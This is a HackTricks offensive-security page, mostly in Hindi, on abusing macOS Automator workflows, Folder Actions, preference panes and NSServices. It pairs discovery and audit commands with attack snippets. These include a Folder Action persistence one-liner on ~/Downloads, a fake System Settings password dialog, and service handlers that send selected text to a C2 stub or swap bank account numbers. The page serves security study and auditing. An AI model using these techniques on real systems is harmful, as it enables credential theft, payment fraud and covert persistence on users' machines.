# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basic Information

**Automator** macOS का visual automation tool है। यह **workflows** (`.workflow` bundles) को execute करता है, जो **actions** (`.action` bundles) से बने होते हैं। Automator, **Folder Actions**, **Quick Actions**, और **Shortcuts** integration को भी power करता है। आधुनिक macOS में workflows को **Shortcuts** में **import** भी किया जा सकता है, इसलिए वही malicious logic Finder Quick Action, `~/Library/Services/` के अंतर्गत user service, या legacy Automator actions द्वारा backed shortcut के रूप में दिखाई दे सकता है।

Automator actions, **plugins** होते हैं जिन्हें workflow execute होने पर Automator runtime में load किया जाता है। वे:
- Arbitrary shell scripts execute कर सकते हैं
- Files और data process कर सकते हैं
- AppleScript के माध्यम से applications के साथ interact कर सकते हैं
- Complex automation के लिए एक-दूसरे से chain हो सकते हैं

### Why This Matters

> [!WARNING]
> Automator workflows को **social-engineer** करके execute करवाया जा सकता है — वे simple document files जैसे दिखाई देते हैं। एक `.workflow` bundle में embedded shell commands हो सकते हैं, जो workflow run होने पर execute होते हैं। Folder Actions के साथ मिलकर, ये **automatic persistence** प्रदान करते हैं, जो file events पर trigger होती है। हाल के Gatekeeper fixes ने यह भी दिखाया कि **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) को harmless data नहीं, बल्कि executable content माना जाना चाहिए।

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

अधिकांश users को `.workflow` bundle एक सामान्य document file जैसा दिखाई देता है:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions monitored folder में files जोड़े जाने पर automatically एक workflow execute करते हैं:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions reboots के बाद भी persist रहते हैं और silently execute होते हैं। `~/Downloads` पर Folder Action का अर्थ है कि **हर downloaded file आपके payload को trigger करती है** — इसमें Safari, Chrome, AirDrop और email attachments से आने वाली files भी शामिल हैं। यह भी ध्यान दें कि `System Events` ऐसे Folder Actions register कर सकता है जो default `~/Library/Scripts/Folder Action Scripts` locations के बाहर मौजूद scripts की ओर point करते हैं, इसलिए loose-path hunting करना उपयोगी है। संबंधित TCC implications के लिए [TCC page](../macos-security-protections/macos-tcc/README.md) देखें।

---

## Preference Panes

### Basic Information

Preference panes (`.prefPane` bundles), **System Settings** (पूर्व में System Preferences) द्वारा load किए जाने वाले plugins हैं। ये system या third-party features के लिए configuration UI panels प्रदान करते हैं। पुराने systems पर इन्हें सीधे `System Preferences` द्वारा load किया जाता था; नए releases पर third-party panes को आमतौर पर System Settings से शुरू की गई **legacy loader XPC service** broker करती है।

### Why This Matters

- Preference panes, System Settings / System Preferences द्वारा spawned एक **trusted host process** में execute होते हैं
- Modern systems पर वह host एक **`legacyLoader` XPC service** हो सकता है, इसलिए महत्वपूर्ण boundary अब भी **trusted Apple UI process -> third-party code loading** है
- Third-party preference panes **host process security context** और उस UI से जुड़े user trust को inherit करते हैं
- Users preference panes को **double-click** करके install करते हैं — यह आसान social engineering है
- Install होने के बाद, जब भी System Settings उस panel पर खुलता है, वे **persist** रहते हैं और load होते हैं

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

एक malicious preference pane **pane host's** security context को inherit करता है (ऐतिहासिक रूप से `System Preferences`, और नए versions में अक्सर `System Settings` द्वारा launched `legacyLoader` helper):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Installation के माध्यम से Persistence
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attack: UI Phishing

एक preference pane credentials के लिए **phish** करने हेतु legitimate system UI panels की नकल कर सकता है:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basic Information

**NSServices** applications को **Services menu** (right-click → Services) के माध्यम से अन्य apps को functionality प्रदान करने की अनुमति देते हैं। जब कोई user text या data चुनकर किसी service को invoke करता है, तो चुना गया data processing के लिए **service provider को भेजा जाता है**।

Services को application के `Info.plist` में `NSServices` key के अंतर्गत declare किया जाता है और pasteboard server (`pbs`) के साथ register किया जाता है। macOS एक **service cache** और एक **restriction policy** भी रखता है, जो तय करते हैं कि कौन-सी services दिखाई देंगी और sandboxed callers को extra warning मिलनी चाहिए या नहीं।

### Why This Matters

- Services को **cross-application data flow** प्राप्त होता है — किसी भी application से चुना गया text service को भेजा जाता है
- एक malicious service password managers, email clients और financial apps से data capture कर सकती है
- Services calling application को **modified data वापस भेज** सकती हैं (selection operations पर man-in-the-middle)
- Service names को legitimate दिखने के लिए बनाया जा सकता है ("Format Text", "Encrypt Selection", "Share")
- Optional `NSRestricted` flag security-relevant है: unrestricted के रूप में marked service को sandboxed app द्वारा उस warning के बिना callable बनाया जा सकता है, जो macOS escape-prone services के लिए दिखाता है<sup>[[2]](#references)</sup>

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### हमला: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Attack: Data Modification (Man-in-the-Middle)

कोई service वैध function प्रदान करती हुई दिखाई देते हुए लौटाए गए data को **modify कर सकती है**:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services और Modern Abuse

Apple प्रत्येक service definition के लिए एक optional `NSRestricted` boolean support करता है। यदि यह set है, तो macOS sandboxed callers को चेतावनी देता है क्योंकि service उन्हें **sandbox या privacy boundaries से बाहर निकलने** में सहायता कर सकती है। Offensive perspective से, इससे audit के दो उपयोगी रास्ते मिलते हैं:

- ऐसे **third-party services खोजें जिन्हें restricted के रूप में mark नहीं किया गया है**, जबकि वे Apple Events, file access या अन्य privileged actions को proxy करते हैं
- मजबूत entitlements वाले **high-value built-in services खोजें** (उदाहरण के लिए, Script Editor या Finder-backed helpers द्वारा exposed services) और जाँचें कि क्या user interaction उन्हें data-access primitive में बदलने के लिए पर्याप्त है

एक अच्छा हालिया उदाहरण **CVE-2022-48574** है, जिसमें Services mechanism का abuse करके **expected confirmation flow के बिना TCC-protected user files तक पहुँचा जा सकता था**। Bug ठीक कर दिया गया है, लेकिन threat modeling के लिए technique अभी भी उपयोगी है: caller की ओर से file access या automation requests forward करने वाली किसी भी service की उसी स्तर पर जाँच की जानी चाहिए।<sup>[[2]](#references)</sup>

---

## हालिया Security Notes

- **Quick Actions executable content हैं**: Apple ने 2024 में एक Gatekeeper bypass ठीक किया, जिसमें app-bundled Automator Quick Action normal assessment के बिना run हो सकती थी। Apps का audit करते समय `Contents/PlugIns/*.workflow/Contents/document.wflow` को ठीक उसी तरह inspect करें जैसे आप helper scripts या login items को inspect करते। [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md) देखें।<sup>[[1]](#references)</sup>
- **Shortcuts legacy Automator behavior inherit कर सकते हैं**: Apple ने third-party shortcuts द्वारा **legacy Automator action** का उपयोग करके expected permission flow के बिना Apple Events भेजे जाने के बाद एक additional user-consent prompt भी जोड़ा। Imported workflows और shortcut bundles में `Run AppleScript`, `Run Shell Script` और similar bridge actions की समीक्षा की जानी चाहिए। [the TCC page](../macos-security-protections/macos-tcc/README.md) देखें।<sup>[[3]](#references)</sup>
- **Automator अभी भी एक live privacy boundary है**: Apple ने protected user data तक access के लिए 2025 में एक और Automator fix जारी किया। भले ही Automator एक legacy surface हो, किसी भी workflow runner, Quick Action host या automation bridge को dead code के बजाय current attack surface मानें।<sup>[[4]](#references)</sup>

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Preference Pane → TCC Escalation
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Password Manager की चोरी
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## संदर्भ

- [1] [Apple — macOS Ventura 13.7, Sonoma 14.7, और Sequoia 15 की security content के बारे में](https://support.apple.com/en-us/121238)
- [2] [Moonlock — macOS पर NSServices exploit ने कैसे काम किया](https://moonlock.com/nsservices-macos)
- [3] [Apple — macOS Sonoma 14.6 (CVE-2024-40834) की security content के बारे में](https://support.apple.com/en-us/120911)
- [4] [Apple — macOS Sequoia 15.4 (CVE-2025-30460) की security content के बारे में](https://support.apple.com/en-us/122373)

{{#include ../../../banners/hacktricks-training.md}}
